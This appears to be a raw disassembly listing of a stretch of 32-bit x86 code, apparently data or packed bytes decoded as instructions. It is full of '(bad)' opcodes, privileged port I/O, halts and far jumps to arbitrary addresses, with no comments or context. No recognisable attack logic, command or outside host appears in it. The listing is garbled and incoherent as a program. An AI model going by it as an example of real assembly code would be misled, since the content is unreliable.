  408dea:	sub    DWORD PTR [ebx+edi*8-0x74],ebp
  408dee:	jl     0x408da0
  408df0:	(bad)  
  408df1:	dec    DWORD PTR [esi]
	...
  408dff:	add    BYTE PTR [eax],al
  408e01:	add    BYTE PTR [edx-0x6ff2f72],dl
  408e07:	std    
  408e08:	fidiv  DWORD PTR [ebp-0x32]
  408e0b:	xchg   DWORD PTR [ebp-0x8d52d0],eax
  408e11:	push   eax
  408e12:	bound  esi,QWORD PTR [edi-0xf45ff59]
  408e18:	and    ecx,DWORD PTR [ebp-0x146f9]
  408e1e:	lods   eax,DWORD PTR ds:[esi]
  408e1f:	fsin   
  408e21:	jne    0x408da5
  408e23:	push   0x45
  408e25:	rcr    DWORD PTR [ebp-0x418a008e],cl
  408e2b:	jb     0x408ea2
  408e2d:	or     BYTE PTR [edx-0x42002c80],ah
  408e33:	rcr    BYTE PTR [edx-0x37],cl
  408e36:	mov    eax,0xd154fffd
  408e3b:	gs add esp,0xffff69e2
  408e42:	scas   eax,DWORD PTR es:[edi]
  408e43:	cmp    al,0xfc
  408e45:	push   eax
  408e46:	fucomp st(3)
  408e48:	or     edi,edi
  408e4a:	neg    DWORD PTR [edx+0x6a4a4128]
  408e50:	mov    edx,0xb023aa8
  408e55:	shr    BYTE PTR ds:0xa00e77d,0x2
  408e5c:	mov    DWORD PTR [ebp-0x4e],0xfa000009
  408e63:	mov    edx,0xf445
	...
  408e74:	add    BYTE PTR [ebp+0x10fffffa],bl
  408e7a:	add    ch,BYTE PTR [edx+0x0]
  408e7d:	jg     0x408efb
  408e7f:	in     al,dx
  408e80:	idiv   DWORD PTR ds:0xfa6a5072
  408e86:	test   BYTE PTR [ebp-0xc],al
  408e89:	sbb    al,BYTE PTR [ebp-0x109c0b7b]
  408e8f:	xchg   edx,eax
  408e90:	push   DWORD PTR [ebx]
  408e92:	call   FWORD PTR [eax]
  408e94:	clc    
  408e95:	les    edx,FWORD PTR [eax]
  408e97:	(bad)
  408e9b:	add    al,0x0
  408e9d:	push   0xba0517dc
  408ea2:	dec    eax
  408ea3:	add    al,0x0
  408ea5:	arpl   WORD PTR [ebx],bx
  408ea7:	push   eax
  408ea8:	in     al,dx
  408ea9:	xchg   esp,eax
  408eaa:	scas   al,BYTE PTR es:[edi]
  408eab:	xchg   edx,eax
  408eac:	add    DWORD PTR [edi],ecx
  408eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408eaf:	xchg   BYTE PTR [ebp-0x6d4981],bh
  408eb5:	pop    esp
  408eb6:	ror    BYTE PTR [eax],1
  408eb8:	jmp    DWORD PTR [esi]
  408eba:	les    ebx,FWORD PTR [esi-0x1d37f44a]
  408ec0:	inc    eax
  408ec1:	arpl   WORD PTR [ecx],si
  408ec3:	mov    ah,dh
  408ec5:	ins    BYTE PTR es:[edi],dx
  408ec6:	xchg   dx,ax
  408ec8:	push   eax
  408ec9:	dec    ebx
  408eca:	sbb    ebx,DWORD PTR [ebx+0x0]
  408ecd:	arpl   WORD PTR [edi+0x29d274c3],sp
  408ed3:	mov    al,ch
  408ed5:	dec    esp
  408ed6:	test   BYTE PTR [edx+0x50],dl
	...
  408ee8:	out    dx,al
  408ee9:	and    DWORD PTR [edi+0x331434f7],edx
  408eef:	push   DWORD PTR [esi+0x7c3592aa]
  408ef5:	cmc    
  408ef6:	inc    esp
  408ef7:	add    BYTE PTR [ebx],cl
  408ef9:	aaa    
  408efa:	stos   DWORD PTR es:[edi],eax
  408efb:	call   DWORD PTR [eax+ebp*4]
  408efe:	ret    
  408eff:	je     0x408eb3
  408f01:	and    eax,0x440cf088
  408f06:	xchg   edx,eax
  408f07:	push   0xbea29e62
  408f0c:	hlt    
  408f0d:	dec    ecx
  408f0e:	sti    
  408f0f:	out    0xa1,eax
  408f11:	lock xchg ecx,eax
  408f13:	jmp    eax
  408f15:	add    eax,0x8cd49f64
  408f1a:	push   ds
  408f1b:	add    al,0x4e
  408f1d:	stc    
  408f1e:	add    BYTE PTR [ebx],0xcc
  408f21:	adc    ah,cl
  408f23:	fwait
  408f24:	je     0x408edd
  408f26:	push   es
  408f27:	xchg   edx,eax
  408f28:	enter  0x92ff,0x4
  408f2c:	mov    ah,0x12
  408f2e:	loope  0x408ecb
  408f30:	xor    BYTE PTR [edi+0x52a491ee],0xd1
  408f37:	cdq    
  408f38:	pushf  
  408f39:	mov    esi,ds
  408f3b:	push   edi
  408f3c:	xchg   ebx,eax
  408f3d:	xchg   esp,eax
  408f3e:	(bad)  
  408f3f:	xchg   ecx,eax
  408f40:	mov    WORD PTR [edx],ss
  408f42:	loope  0x408edf
  408f44:	push   ds
  408f45:	mov    bh,0xc6
  408f47:	xchg   ecx,eax
  408f48:	jl     0x408f9c
  408f4a:	mov    ecx,0x99
	...
  408f5b:	je     0x408ee9
  408f5d:	ror    DWORD PTR ds:0x91ae8c96,0x1e
  408f64:	lea    edx,[eax-0x6173a224]
  408f6a:	xchg   ecx,eax
  408f6b:	into   
  408f6c:	mov    DWORD PTR [ecx-0x16fafb39],eax
  408f72:	mov    edx,0x36e8fd21
  408f77:	call   0x4008f814
  408f7c:	xchg   esp,eax
  408f7d:	jbe    0x408f10
  408f7f:	fiadd  WORD PTR [ecx+0x6d]
  408f82:	xor    al,0x24
  408f84:	adc    dh,ch
  408f86:	nop
  408f87:	push   esi
  408f88:	in     al,0xf
  408f8a:	inc    ebx
  408f8b:	arpl   WORD PTR [ebp+0x5636985],bx
  408f91:	loop   0x408f56
  408f93:	push   esp
  408f94:	sbb    BYTE PTR [edx+0x26056302],0x47
  408f9b:	sti    
  408f9c:	add    al,0x0
  408f9e:	jmp    0xa5079503
  408fa3:	int3   
  408fa4:	mov    eax,DWORD PTR [edi]
  408fa6:	jmp    0x9340af0b
  408fab:	pusha  
  408fac:	pop    ds
  408fad:	add    BYTE PTR [ebx+0x15457a60],al
  408fb3:	(bad)  
  408fb4:	jp     0x408f3b
  408fb6:	std    
  408fb7:	fisttp DWORD PTR [ebx+0x11d399ff]
  408fbd:	clc    
  408fbe:	test   BYTE PTR [eax],0x0
	...
  408fcd:	add    BYTE PTR [ebp-0x77],dl
  408fd0:	call   0x45cb44
  408fd5:	repnz mov al,ds:0x9ad00510
  408fdb:	add    al,0x0
  408fdd:	jmp    0x2868fd4a
  408fe2:	pop    edi
  408fe3:	mov    WORD PTR [ebp-0xb],?
  408fe6:	fsub   DWORD PTR [ebp-0x28]
  408fe9:	mov    esi,0x998b34d3
  408fee:	in     eax,dx
  408fef:	xor    esp,0x508bd3b6
  408ff5:	cmp    edi,edi
  408ff7:	je     0x408fd1
  408ff9:	sahf   
  408ffa:	repz jl 0x408f82
  408ffd:	cdq    
  408ffe:	jmp    0x408f8a
  409000:	inc    DWORD PTR [ecx-0x79004e05]
  409006:	pop    esi
  409007:	add    eax,0x46439468
  40900c:	add    BYTE PTR [esi-0x6b],dh
  40900f:	xchg   ebp,eax
  409010:	imul   DWORD PTR [esi-0x2d]
  409013:	mov    dh,BYTE PTR ds:0x46380e
  409019:	push   ecx
  40901a:	retf   
  40901b:	mov    dl,0xff
  40901d:	push   esi
  40901e:	mov    DWORD PTR [eax-0x750ca91c],eax
  409024:	push   0x0
  409026:	or     ch,bh
  409028:	(bad)  [edi]
  40902a:	retf   
  40902b:	push   es
  40902c:	push   DWORD PTR [ebp-0x92d6]
	...
  40903e:	add    BYTE PTR [eax],al
  409040:	add    BYTE PTR ds:0xb2926b3,dh
  409046:	pop    es
  409047:	call   0xffb61e15
  40904c:	mov    DWORD PTR [edi],edi
  40904e:	push   0xfffffff7
  409050:	call   DWORD PTR [ebp-0x18]
  409053:	jmp    DWORD PTR [edi+0x6d]
  409056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409057:	inc    eax
  409058:	add    BYTE PTR [ebp-0x4a080fd0],dh
  40905e:	jp     0x40905f
  409060:	xor    eax,0x40af9d
  409065:	mov    dl,0x2e
  409067:	xlat   BYTE PTR ds:[ebx]
  409068:	push   DWORD PTR [ebp-0x52177af8]
  40906e:	jp     0x40906f
  409070:	adc    edi,0x5d
  409073:	idiv   edi
  409075:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409076:	add    DWORD PTR [ecx+ecx*2+0x9],esi
  40907a:	xor    al,0xec
  40907c:	div    DWORD PTR [ebp+0x3a74007a]
  409082:	xchg   BYTE PTR [ebp-0x860218],bh
  409088:	add    BYTE PTR [esi-0x4e],ch
  40908b:	add    BYTE PTR [bp+si],bh
  40908e:	imul   edi,DWORD PTR [esi-0x18769001],0xffffffee
  409095:	fidivr DWORD PTR [ecx-0x1]
  409098:	jmp    FWORD PTR [edi+0x65]
  40909b:	idiv   edi
  40909d:	mov    ch,0x7a
  40909f:	jne    0x4090a9
  4090a1:	loop   0x4090e9
  4090a3:	sar    edi,1
	...
  4090b1:	add    BYTE PTR [eax],al
  4090b3:	add    BYTE PTR [ebp-0x52174a86],al
  4090b9:	jp     0x4090ba
  4090bb:	jmp    DWORD PTR [ebx-0x57]
  4090be:	sti    
  4090bf:	out    0x4f,eax
  4090c1:	int    0x8e
  4090c3:	(bad)  
  4090c4:	cld    
  4090c5:	or     BYTE PTR [eax-0x71350b09],ch
  4090cb:	jne    0x409128
  4090cd:	inc    esp
  4090ce:	out    0xd0,al
  4090d0:	in     al,0xda
  4090d2:	mov    ?,WORD PTR [ebp-0x711539]
  4090d8:	retf   
  4090d9:	stos   DWORD PTR es:[edi],eax
  4090da:	mov    bh,0xff
  4090dc:	int3   
  4090dd:	repnz pop eax
  4090df:	in     al,dx
  4090e0:	int3   
  4090e1:	cli    
  4090e2:	mov    gs,eax
  4090e4:	xchg   al,ch
  4090e6:	mov    ?,edi
  4090e8:	mov    ah,0xd0
  4090ea:	fwait
  4090eb:	imul   DWORD PTR [edx+edx*4-0x6570e565]
  4090f2:	mov    ?,edi
  4090f4:	(bad)  
  4090f5:	stos   DWORD PTR es:[edi],eax
  4090f6:	xchg   esi,eax
  4090f7:	call   DWORD PTR [edx+ebp*4+0x787b0818]
  4090fe:	(bad)  
  4090ff:	inc    DWORD PTR [edx+edi*4-0x3d8b0fa8]
  409106:	mov    gs,eax
  409108:	bound  esi,QWORD PTR [eax-0x72]
  40910b:	jmp    FWORD PTR [eax+ebx*8-0x75]
  40910f:	jmp    0xffceeabb
  409114:	pop    esp
  409115:	jmp    0x0:0xe88f
	...
  409124:	add    BYTE PTR [eax],al
  409126:	add    BYTE PTR [eax+0x1a000340],ch
  40912c:	pop    ebp
  40912d:	sti    
  40912e:	jmp    FWORD PTR [edi+0x27839f23]
  409134:	sbb    DWORD PTR [ecx],0x0
  409137:	leave  
  409138:	popf   
  409139:	mov    ?,WORD PTR [ebp+0x5b]
  40913c:	xchg   dl,dh
  40913e:	shl    BYTE PTR [eax+ebx*1],1
  409141:	jl     0x409188
  409143:	pop    ds
  409144:	push   es
  409145:	ror    DWORD PTR [eax+0x44],1
  409148:	inc    esi
  409149:	jmp    0x413e27dc
  40914e:	daa    
  40914f:	add    eax,0x871b4e89
  409154:	fsub   DWORD PTR [edi-0xeed0bfd]
  40915a:	fwait
  40915b:	xchg   esp,eax
  40915c:	xchg   DWORD PTR [esi],esi
  40915e:	mov    ?,WORD PTR [ebx-0x7f]
  409161:	inc    BYTE PTR [ebx+eiz*2-0x78]
  409165:	pushf  
  409166:	sti    
  409167:	mov    esp,0xcc8e1bc9
  40916c:	sbb    eax,0x523de45
  409171:	push   cs
  409172:	sbb    BYTE PTR [ebx-0x63],ch
  409175:	(bad)  
  409176:	nop
  409177:	mov    ah,0x88
  409179:	(bad)  
  40917a:	pop    ss
  40917b:	scas   eax,DWORD PTR es:[edi]
  40917c:	mov    BYTE PTR [ebx+edi*8-0x44],bh
  409180:	lock pop ss
  409182:	mov    ds,WORD PTR [esi+edi*4+0x326308ab]
  409189:	jb     0x40912b
	...
  409197:	add    BYTE PTR [eax],al
  409199:	add    bl,bh
  40919b:	add    al,0xe9
  40919d:	pushf  
  40919e:	lds    ecx,FWORD PTR [eax+0x127c0054]
  4091a4:	icebp  
  4091a5:	fwait
  4091a6:	pop    es
  4091a7:	xchg   edx,eax
  4091a8:	mov    esi,0xe1c39a8d
  4091ad:	add    ecx,DWORD PTR [esi]
  4091af:	jl     0x40916e
  4091b1:	sbb    esi,0xe0fce8f9
  4091b7:	loop   0x4091a0
  4091b9:	add    esp,DWORD PTR [ebx-0x78]
  4091bc:	sbb    al,0x0
  4091be:	cmp    ebp,DWORD PTR [ebx]
  4091c0:	scas   eax,DWORD PTR es:[edi]
  4091c1:	lea    edi,[esp+edi*8]
  4091c4:	test   al,0x17
  4091c6:	push   ebx
  4091c7:	sbb    eax,0x5a3dc61
  4091cc:	add    BYTE PTR [esi+0x4c],dh
  4091cf:	stc    
  4091d0:	out    0x22,eax
  4091d2:	(bad)  
  4091d3:	xchg   edi,edi
  4091d5:	jo     0x409173
  4091d7:	stc    
  4091d8:	imul   ebp,ecx,0xa82ff668
  4091de:	pusha  
  4091df:	sbb    eax,0x5a0191c
  4091e4:	(bad)  
  4091e5:	cld    
  4091e6:	(bad)  
  4091e7:	fadd   QWORD PTR [eax-0x17]
  4091ea:	enter  0xd62e,0x36
  4091ee:	(bad)  
  4091ef:	sti    
  4091f0:	mov    edi,0x5037ceb5
  4091f5:	es ins BYTE PTR es:[edi],dx
  4091f7:	stc    
  4091f8:	out    0x2e,eax
  4091fa:	adc    eax,0xb9ff88
	...
  40920b:	add    BYTE PTR [eax],al
  40920d:	nop
  40920e:	mov    BYTE PTR [ebp-0x1f],dh
  409211:	fdiv   DWORD PTR [ebp-0x1]
  409214:	push   es
  409215:	out    0x9c,al
  409217:	and    DWORD PTR [edx],ebx
  409219:	fiadd  WORD PTR [edi-0x780c2a18]
  40921f:	inc    DWORD PTR [ebx+0x19111d60]
  409225:	and    BYTE PTR ds:0x44b0fd68,al
  40922b:	add    BYTE PTR [ecx+0x61],al
  40922e:	add    eax,0xe6d86900
  409233:	aad    0xc6
  409235:	out    0xfb,eax
  409237:	mov    edi,0x50377d35
  40923c:	mov    dh,0x4d
  40923e:	stc    
  40923f:	out    0x56,eax
  409241:	push   ss
  409242:	xchg   edi,edi
  409244:	cmp    DWORD PTR [edi-0x170e8a7a],ecx
  40924a:	sub    al,0xff
  40924c:	xchg   esi,eax
  40924d:	xlat   BYTE PTR ds:[ebx]
  40924e:	popf   
  40924f:	jmp    0xe8c7820f
  409254:	add    dh,ah
  409256:	push   esp
  409257:	(bad)  
  409258:	call   DWORD PTR [eax+0x1]
  40925b:	push   0x43ea11
  409260:	push   0x40b2cd
  409265:	jge    0x409216
  409267:	sub    DWORD PTR es:[ebx+0x47e5e802],edi
  40926e:	jns    0x40926f
  409270:	or     eax,DWORD PTR [eax]
	...
  40927e:	add    BYTE PTR [eax],al
  409280:	dec    edx
  409281:	out    dx,al
  409282:	sbb    eax,0x7579da50
  409287:	or     al,0x92
  409289:	fcom   st(5)
  40928b:	jmp    FWORD PTR ds:0x17ff4fd2
  409291:	mov    esp,edi
  409293:	and    BYTE PTR [ebp+0x79],bh
  409296:	(bad)  
  409297:	call   0x3fe6c6
  40929c:	bound  ebp,QWORD PTR ds:0xec6dffd2
  4092a2:	jmp    DWORD PTR [edi-0x65]
  4092a5:	mov    dl,0x40
  4092a7:	add    dl,dl
  4092a9:	mov    ecx,0xeaba412f
  4092ae:	add    DWORD PTR [eax],eax
  4092b0:	mov    al,BYTE PTR [edx+0x7ad7ade8]
  4092b6:	dec    DWORD PTR [ebx]
  4092b8:	mov    edx,0x4a501df5
  4092bd:	jp     0x409334
  4092bf:	or     al,0xa2
  4092c1:	mov    ds:0xd19dffd5,eax
  4092c6:	dec    edi
  4092c7:	push   DWORD PTR [edi]
  4092c9:	mov    edi,esp
  4092cb:	call   0xe9400d7c
  4092d0:	xchg   edx,eax
  4092d1:	dec    edi
  4092d2:	(bad)  
  4092d3:	push   edx
  4092d5:	in     eax,dx
  4092d6:	sar    edi,1
  4092d8:	in     eax,dx
  4092d9:	call   0xdda3c2ce
  4092de:	add    edi,edi
  4092e0:	mov    dh,0xa8
  4092e2:	fwait
  4092e3:	add    eax,0x0
	...
  4092f0:	add    BYTE PTR [eax],al
  4092f2:	add    BYTE PTR ds:0x93508b7f,cl
  4092f8:	pop    es
  4092f9:	adc    DWORD PTR [eax],ecx
  4092fb:	cmp    edx,DWORD PTR [edi-0x76]
  4092fe:	call   FWORD PTR [esp+eax*4]
  409301:	xor    edx,edx
  409303:	adc    al,0x1f
  409305:	mov    esi,DWORD PTR [ebp+0x5f]
  409308:	xor    al,0x3b
  40930a:	rol    BYTE PTR [edi+ebp*1],cl
  40930d:	mov    ebp,0x309c6bc2
  409312:	mov    eax,DWORD PTR [edi]
  409314:	sbb    eax,eax
  409316:	hlt    
  409317:	jns    0x4092b5
  409319:	sbb    eax,0xfb48e402
  40931e:	out    0x52,eax
  409320:	out    0x8a,eax
  409322:	(bad)  
  409323:	jmp    0x39d:0x66688758
  40932a:	add    BYTE PTR [ebx-0x43004aa6],bh
  409330:	and    al,0x41
  409332:	clc    
  409333:	dec    ebx
  409334:	cwde   
  409335:	add    al,0x0
  409337:	arpl   WORD PTR [edi-0x1c4407f0],ax
  40933d:	data16 add BYTE PTR [ebx-0x5d],ah
  409341:	ret    
  409342:	je     0x4093b3
  409344:	loope  0x409345
  409346:	add    BYTE PTR [ebx-0x64],ah
  409349:	adc    cl,BYTE PTR ds:0xff8c2884
  40934f:	mul    BYTE PTR [ebx-0x418a7765]
  409355:	mov    ch,bl
	...
  409363:	add    BYTE PTR [eax],al
  409365:	add    BYTE PTR [ebx+0x47],bl
  409368:	adc    al,bh
  40936a:	jnp    0x4093bb
  40936c:	mov    ah,0xff
  40936e:	pop    esp
  40936f:	leave  
  409370:	(bad)  
  409372:	lahf   
  409373:	add    eax,0xd64c8abf
  409378:	popf   
  409379:	adc    BYTE PTR [ebx+0x6d],bl
  40937c:	pop    es
  40937d:	mov    bh,BYTE PTR [eax*4+0x3a3cee03]
  409384:	lahf   
  409385:	mov    ch,BYTE PTR [ecx+edx*1]
  409388:	test   eax,0x73ed4f0f
  40938d:	fisub  DWORD PTR [ebx+0x2a9c1905]
  409393:	pop    ebx
  409394:	data16 mov dh,BYTE PTR [ebx-0x3042b7c]
  40939b:	aam    0x56
  40939d:	mov    bh,ah
  40939f:	out    dx,eax
  4093a0:	or     DWORD PTR [esi+ecx*2+0x588a465b],ebx
  4093a7:	inc    ebp
  4093a8:	mov    ch,0xef
  4093aa:	jl     0x40932e
  4093ac:	push   es
  4093ad:	inc    ebp
  4093ae:	arpl   bp,dx
  4093b0:	inc    eax
  4093b1:	pop    ebp
  4093b2:	scas   al,BYTE PTR es:[edi]
  4093b3:	test   BYTE PTR [esi],ah
  4093b5:	xor    ecx,esp
  4093b7:	cli    
  4093b8:	lock fwait
  4093ba:	xchg   ebx,eax
  4093bb:	adc    DWORD PTR [esi],0xffffff8a
  4093be:	dec    ecx
  4093bf:	and    DWORD PTR [ecx],eax
  4093c1:	xchg   ecx,eax
  4093c2:	mov    es,WORD PTR [esi+eax*1-0x2b061302]
  4093c9:	sbb    eax,DWORD PTR [eax]
	...
  4093d7:	add    BYTE PTR [eax],al
  4093d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093da:	xor    al,0xa8
  4093dc:	add    esi,DWORD PTR [ebx]
  4093de:	ins    DWORD PTR es:[edi],dx
  4093df:	bound  esi,QWORD PTR [eax-0x76c67b6c]
  4093e5:	push   ss
  4093e6:	or     eax,0x8486f3d1
  4093eb:	(bad)  
  4093ec:	push   ds
  4093ed:	arpl   bp,bp
  4093ef:	out    0xd3,al
  4093f1:	and    eax,DWORD PTR ds:0xc63ce851
  4093f7:	call   0x6cc284
  4093fc:	add    BYTE PTR [eax+0x1359e805],ah
  409402:	test   bh,bh
  409404:	cmp    edx,ebx
  409406:	stc    
  409407:	pop    es
  409408:	xchg   ecx,eax
  409409:	lock cmp edi,0x68055d96
  409410:	clc    
  409411:	adc    ch,al
  409413:	call   DWORD PTR [eax]
  409415:	cmp    esi,DWORD PTR [ecx+eax*2]
  409418:	jmp    0xc067cdf8
  40941d:	mov    eax,ds:0xc4f9e805
  409422:	cmp    edi,0xfffffff2
  409425:	and    cl,bh
  409427:	adc    eax,0xff794470
  40942c:	fsub   st(4),st
  40942e:	xor    DWORD PTR [ebp-0x1f],0xffffffd8
  409432:	mov    ch,0xfd
  409434:	inc    esi
  409435:	fiadd  DWORD PTR [ebx+0x42c73575]
  40943b:	shl    DWORD PTR [esi],1
	...
  409449:	add    BYTE PTR [eax],al
  40944b:	add    dl,ch
  40944d:	out    dx,al
  40944e:	inc    eax
  409450:	bound  esi,QWORD PTR ds:0x4468e941
  409456:	xor    BYTE PTR [eax-0x31ca7ba0],ch
  40945c:	cdq    
  40945d:	(bad)  
  40945e:	inc    DWORD PTR [eax]
  409460:	stos   BYTE PTR es:[edi],al
  409461:	push   edi
  409462:	inc    DWORD PTR [esi]
  409464:	ja     0x4093ea
  409466:	jne    0x409459
  409468:	enter  0xfda4,0xf6
  40946c:	jmp    0x40945c
  40946e:	inc    DWORD PTR [eax-0x16becc6f]
  409474:	push   0x5f283044
  409479:	test   BYTE PTR ds:0xffc4980e,dh
  40947f:	ror    BYTE PTR [ebx-0x5aff00a9],0x80
  409486:	mov    edi,0x44fe8c74
  40948b:	hlt    
  40948c:	adc    eax,0x8ffff414
  409491:	and    edi,0xff8e0760
  409497:	jmp    FWORD PTR [edi-0x6b]
  40949a:	call   0xffce8f8c
  40949f:	push   0x4a
  4094a1:	pop    ds
  4094a2:	push   es
  4094a3:	xor    BYTE PTR [ebx+0x9],bh
  4094a6:	push   0xffc7ea1c
  4094ab:	or     BYTE PTR [bx],al
  4094ae:	add    BYTE PTR [eax+0x0],al
	...
  4094bc:	add    BYTE PTR [eax],al
  4094be:	add    dl,ah
  4094c0:	popf   
  4094c1:	sar    edi,cl
  4094c3:	test   DWORD PTR [esi],esi
  4094c5:	push   DWORD PTR [ebp+0x12]
  4094c8:	lahf   
  4094c9:	push   eax
  4094ca:	std    
  4094cb:	xchg   ebp,eax
  4094cc:	lea    ebp,[edx+0x0]
  4094cf:	and    bh,BYTE PTR [eax+0x2f]
  4094d2:	inc    ecx
  4094d3:	cli    
  4094d4:	push   ds
  4094d5:	sbb    al,0x30
  4094d7:	mov    ebx,0xca026806
  4094dc:	push   es
  4094dd:	sub    al,0x7a
  4094e0:	mov    ecx,0x46d1ffff
  4094e5:	je     0x4094fd
  4094e7:	push   ebx
  4094e8:	inc    ebx
  4094e9:	hlt    
  4094ea:	(bad)  
  4094eb:	fist   WORD PTR [edx-0x613d8a01]
  4094f1:	adc    ebp,edi
  4094f3:	gs (bad) 
  4094f5:	push   DWORD PTR [ebp-0x52]
  4094f8:	lahf   
  4094f9:	sahf   
  4094fa:	rcl    BYTE PTR [ebp-0x1dff9576],1
  409500:	add    al,0x30
  409502:	inc    ecx
  409503:	jp     0x409523
  409505:	aas    
  409506:	xor    BYTE PTR [ebx],bh
  409508:	or     DWORD PTR [eax+0x2],ebp
  40950b:	arpl   WORD PTR [ebx+eax*1-0x80],bp
  40950f:	mov    ecx,DWORD PTR [ebx+esi*4-0x78e39301]
  409516:	jne    0x409573
  409518:	push   esp
  409519:	add    eax,0x1abb5cfd
  40951e:	add    bl,cl
  409520:	pop    ebp
  409521:	rol    DWORD PTR [eax+0x0],cl
	...
  409530:	add    BYTE PTR [eax],al
  409532:	arpl   WORD PTR [edi+eax*8],dx
  409535:	das    
  409536:	mov    ds:0x63021b6c,al
  40953b:	ins    BYTE PTR es:[edi],dx
  40953c:	sub    eax,0xffffffe2
  40953f:	mov    esi,0xac58ff87
  409544:	adc    BYTE PTR [esi],dl
  409546:	fisubr DWORD PTR [eax]
  409548:	nop
  409549:	call   DWORD PTR [esi+0x6b758700]
  40954f:	test   dl,al
  409551:	cld    
  409552:	or     al,0xeb
  409554:	xchg   BYTE PTR [ebp+0xf],dh
  409557:	aam    0x36
  409559:	sar    ah,1
  40955b:	fiadd  DWORD PTR [esi+0x10d2f775]
  409561:	or     bl,bh
  409563:	sub    eax,0x34e4ffb9
  409568:	ret    0x6304
  40956b:	mov    eax,ds:0x6c4bec7a
  409570:	add    ebp,edi
  409572:	or     eax,0xc40c112b
  409577:	cwde   
  409578:	sti    
  409579:	out    0x54,eax
  40957b:	push   ds
  40957c:	xchg   edi,edi
  40957e:	stos   BYTE PTR es:[edi],al
  40957f:	sub    eax,0xf717fffc
  409584:	xchg   edi,eax
  409585:	sbb    DWORD PTR [edi-0x630079c9],0x95b88132
  40958f:	jb     0x409517
  409591:	add    BYTE PTR [ebx+0x5],ah
  409594:	jmp    0x40959c
	...
  4095a5:	fadd   st,st(7)
  4095a7:	in     al,dx
  4095a8:	cli    
  4095a9:	mov    esp,0x3b83ebf8
  4095ae:	add    eax,0xdb7a0154
  4095b3:	out    0x3,eax
  4095b5:	arpl   WORD PTR [edx+0x7044f834],ax
  4095bb:	xchg   ebx,eax
  4095bc:	xchg   BYTE PTR [ebp+ecx*1-0x57],dl
  4095c0:	adc    BYTE PTR [ebp+ebp*8+0x6f],bl
  4095c4:	xlat   BYTE PTR ds:[ebx]
  4095c5:	mov    ds:0x6f109e05,eax
  4095ca:	ins    DWORD PTR es:[edi],dx
  4095cb:	bound  esi,QWORD PTR [edx-0x77d7ecc]
  4095d1:	les    ecx,FWORD PTR [edi-0x7f9cbb2b]
  4095d7:	hlt    
  4095d8:	test   DWORD PTR [edx+eax*1],0x8f14869a
  4095df:	fs dec ebx
  4095e1:	or     eax,0x451b6681
  4095e6:	push   es
  4095e7:	jmp    0x2bcb83ef
  4095ec:	test   esp,esi
  4095ee:	cmp    BYTE PTR [ecx+0x4650f79b],0x86
  4095f5:	(bad)  
  4095f6:	mov    ch,BYTE PTR [ebx]
  4095f8:	test   esp,ebx
  4095fa:	sbb    BYTE PTR [ecx+0x2fbe0e86],0x86
  409601:	int3   
  409602:	ins    DWORD PTR es:[edi],dx
  409603:	fldenv [ebx+eiz*2+0x5]
  409607:	jo     0x409589
	...
  409615:	add    BYTE PTR [eax],al
  409617:	add    bh,bh
  409619:	jg     0x409631
  40961b:	xchg   BYTE PTR [ebx],ah
  40961d:	adc    BYTE PTR [ebp-0x76],ah
  409620:	arpl   WORD PTR ds:0x43ce78e9,ax
  409626:	inc    DWORD PTR [ebp-0x14ff8764]
  40962c:	nop
  40962d:	cmp    bh,0xe9
  409630:	pop    esp
  409631:	jmp    0x6567:0xd0ab2b8c
  409638:	fwait
  409639:	(bad)  
  40963c:	ins    BYTE PTR es:[edi],dx
  40963d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40963e:	add    cl,ch
  409640:	imul   eax,eax,0x75
  409643:	in     al,dx
  409644:	leave  
  409645:	mov    dh,0x0
  409647:	jmp    0xabd628ac
  40964c:	fnstsw WORD PTR [edi-0x1]
  40964f:	pop    esp
  409650:	mov    eax,ds:0xc5115031
  409655:	xor    DWORD PTR [ecx-0x17],eax
  409658:	fdiv   DWORD PTR [eax+eiz*4-0x17]
  40965c:	pusha  
  40965d:	or     al,0xc0
  40965f:	adc    al,0x2c
  409661:	ins    DWORD PTR es:[edi],dx
  409662:	xchg   esp,eax
  409663:	jmp    0x61a89bc8
  409668:	aas    
  409669:	(bad)  
  40966c:	fs adc eax,ebp
  40966f:	jbe    0x409642
  409671:	jg     0x409672
  409673:	je     0x4096e9
  409675:	inc    ebx
  409676:	(bad)  
  409677:	pop    esi
  409678:	out    0x91,al
  40967a:	push   edx
  40967b:	add    eax,0x0
	...
  409688:	add    BYTE PTR [eax],al
  40968a:	add    BYTE PTR [ecx],dh
  40968c:	aad    0xe7
  40968e:	adc    dh,BYTE PTR [edx-0x20660081]
  409694:	stc    
  409695:	setns  bh
  409698:	stc    
  409699:	pop    es
  40969a:	inc    ecx
  40969b:	sar    DWORD PTR [esi-0x1],1
  40969e:	cs out dx,eax
  4096a0:	ss iret 
  4096a2:	fisubr WORD PTR es:[ebx+0x63]
  4096a6:	ins    BYTE PTR es:[edi],dx
  4096a7:	and    DWORD PTR [ecx],esi
  4096a9:	mov    DWORD PTR [ebx+edx*1+0x7f],ebp
  4096ad:	dec    DWORD PTR [esi]
  4096af:	dec    edi
  4096b0:	mov    WORD PTR [eax],?
  4096b2:	add    bl,bh
  4096b4:	add    edi,edi
  4096b6:	mov    ch,0x56
  4096b8:	xchg   edi,edi
  4096ba:	jmp    DWORD PTR [edx-0x2e]
  4096bd:	mov    al,ds:0xbf7c7a00
  4096c2:	je     0x4096f8
  4096c4:	and    DWORD PTR [eax-0xf6b4d8],ebx
  4096ca:	jne    0x40974a
  4096cc:	fwait
  4096cd:	test   eax,0xff889dd2
  4096d2:	mov    ch,0xe6
  4096d4:	mov    edi,edi
  4096d6:	(bad)  
  4096d7:	jp     0x40967a
  4096d9:	icebp  
  4096da:	ror    BYTE PTR ds:0xb950508a,cl
  4096e0:	pop    es
  4096e1:	adc    BYTE PTR [eax],al
  4096e3:	data16 jbe 0x40974d
  4096e6:	push   0x1a
  4096e8:	(bad)  
  4096e9:	dec    DWORD PTR [edi-0x1e]
  4096ec:	add    DWORD PTR [ecx+0x0],esp
	...
  4096fe:	cmp    bl,BYTE PTR [esi+0x33bb805]
  409704:	add    BYTE PTR [eax],al
  409706:	inc    eax
  409707:	jl     0x4096c8
  409709:	je     0x40970e
  40970b:	xor    eax,0x9b0275ff
  409710:	xchg   esi,eax
  409711:	(bad)  
  409712:	jge    0x40969d
  409714:	call   0xffc9e3ea
  409719:	lea    eax,[edi-0x620001bc]
  40971f:	xor    bh,bh
  409721:	mov    ch,0xde
